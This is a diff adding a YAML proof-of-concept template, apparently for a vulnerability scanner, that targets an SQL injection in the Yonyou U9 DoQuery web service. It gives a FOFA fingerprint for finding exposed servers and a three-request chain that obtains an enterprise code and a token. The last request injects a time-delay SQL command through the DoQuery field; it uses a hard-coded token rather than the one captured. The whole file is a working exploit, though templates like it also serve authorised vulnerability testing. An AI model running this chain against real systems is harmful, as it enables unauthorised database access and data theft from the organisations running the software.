@@ -1,0 +1,69 @@
+id: poc-yaml-yongyou-u9-doquery-sqli
+info:
+  name: 用友U9 DoQuery SQL注入漏洞
+  severity: high
+  tags:
+  - sql-injection
+  finger: 用友U9
+  fofa: body="logo-u9.png"
+variables:
+  t1: random_int(4,9)
+  t2: t1 + 2
+requests:
+- method: POST
+  path: /CS/Office/TransWebService.asmx
+  headers:
+    Content-Type: text/xml; charset=utf-8
+    SOAPAction: http://tempuri.org/GetEnterprise
+  data: '<soap:Envelope xmlns:soap="http://www.w3.org/2003/05/soap-envelope" xmlns:tem="http://tempuri.org/">
+
+    <soap:Header/>
+
+    <soap:Body>
+
+    <tem:GetEnterprise/>
+
+    </soap:Body>
+
+    </soap:Envelope>'
+  expression: status_code == 200 && contains(body,"\"Code\":")
+  output:
+  - regex_match(body,`"Code":"(?P<code>.*?)",`)
+- method: POST
+  path: /CS/Office/TransWebService.asmx
+  headers:
+    SOAPAction: http://tempuri.org/GetToken
+    Content-Type: text/xml;charset=UTF-8
+  data: "<soap:Envelope xmlns:soap=\"http://www.w3.org/2003/05/soap-envelope\" xmlns:tem=\"\
+    http://tempuri.org/\">\n<soap:Header/>\n<soap:Body>\n<tem:GetToken>\n   <!--type:\
+    \ string-->\n   <tem:endId>{{.code}}</tem:endId>\n</tem:GetToken>\n</soap:Body>\n\
+    </soap:Envelope>"
+  expression: status_code == 200 && contains(body,"\"Token\":")
+  output:
+  - regex_match(body,`"Token":"(?P<token>.*?)","`)
+- method: POST
+  path: /CS/Office/TransWebService.asmx
+  headers:
+    SOAPAction: http://tempuri.org/DoQuery
+    Content-Type: text/xml;charset=UTF-8
+  data: '<?xml version="1.0" encoding="utf-8"?>
+
+    <soap:Envelope xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance" xmlns:xsd="http://www.w3.org/2001/XMLSchema"
+    xmlns:soap="http://schemas.xmlsoap.org/soap/envelope/">
+
+    <soap:Body>
+
+    <DoQuery xmlns="http://tempuri.org/">
+
+    <token>YR0NgK63+l82yPl81gZ7VM29jzwTOTPF</token>
+
+    <command>select 1;waitfor delay ''0:0:{{.t1}}'' --</command>
+
+    </DoQuery>
+
+    </soap:Body>
+
+    </soap:Envelope>'
+  expression: status_code == 200 && contains(body,"\"Column1\":") && contains(body,"<Datas>")
+    && contains(content_type,"text/xml") && duration > t1 && duration < t2
+transport: http
